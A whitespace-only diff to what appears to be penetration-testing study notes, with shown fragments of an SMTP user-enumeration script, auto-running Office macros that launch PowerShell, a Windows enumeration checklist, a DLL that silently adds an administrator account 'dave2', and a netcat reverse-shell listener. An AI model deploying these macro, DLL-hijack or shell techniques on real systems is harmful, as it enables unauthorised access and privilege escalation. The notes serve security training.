@@ -284,8 +284,8 @@ import socket
 import sys
 
 if len(sys.argv) != 3:
-	print("Usage: vrfy.py <username> <target_ip>")
-	sys.exit(0)
+   print("Usage: vrfy.py <username> <target_ip>")
+   sys.exit(0)
 
 #create a socket
 s = socket.socket(soket.AF_INET, socket.SOCK_STREAM)
@@ -997,7 +997,7 @@ Older version .**doc** file containing macros inside, Newer version .**docx** fi
 
 ```visual-basic
 Sub Mymacro()
-	CreateObjects("Wscript.Shell").Run "Powershell"
+   CreateObjects("Wscript.Shell").Run "Powershell"
 End Sub
 ```
 
@@ -1005,13 +1005,13 @@ Since Office macros are not executed automatically, we must use the predefined *
 
 ```visual-basic
 Sub AutoOpen()
-	Mymacro
+   Mymacro
 End Sub
 Sub Document_Open()
-	Mymacro
+   Mymacro
 End Sub
 Sub Mymacro()
-	CreateObject("Wscript.shell").Run "Powershell"
+   CreateObject("Wscript.shell").Run "Powershell"
 End Sub
 ```
 
@@ -1019,14 +1019,14 @@ We’ll declare a string variable name str with the Dim keyword, which we’ll u
 
 ```visual-basic
 Sub AutoOpen()
-	Mymacro
+   Mymacro
 End Sub
 Sub Document_Open()
-	Mymacro
+   Mymacro
 End Sub
 Sub Mymacro()
 Dim Str As String
-	CreateObject("Wscript.shell").Run Str
+   CreateObject("Wscript.shell").Run Str
 End Sub
 ```
 
@@ -1700,8 +1700,8 @@ There are several key pieces of information we should always obtain:
 ```
 - Username and hostname - whoami
 - Group memberships of the current user - whoami /group
-	- Existing users and groups -powershell->Get-LocalUser/Get-LocalGroup/
-	Get-LocalGroupMember adminteam/Get-LocalGroupMember Administrator
+   - Existing users and groups -powershell->Get-LocalUser/Get-LocalGroup/
+   Get-LocalGroupMember adminteam/Get-LocalGroupMember Administrator
 - Operating system, version and architecture - systeminfo
 - Network information - ipconfig /all, route print, netstat -ano
 - Installed applications - 
@@ -1870,8 +1870,8 @@ LPVOID lpReserved ) // Reserved
     {
         case DLL_PROCESS_ATTACH: // A process is loading the DLL.
         int i;
-  	    i = system ("net user dave2 password123! /add");
-  	    i = system ("net localgroup administrators dave2 /add");
+       i = system ("net user dave2 password123! /add");
+       i = system ("net localgroup administrators dave2 /add");
         break;
         case DLL_THREAD_ATTACH: // A process is creating a new thread.
         break;
@@ -7919,5 +7919,5 @@ rlwrap nc -nlvp 443
 Restart-Service 'GPGOrchestrator'
 #Got Admin Shell
 
-	
+   
 ```
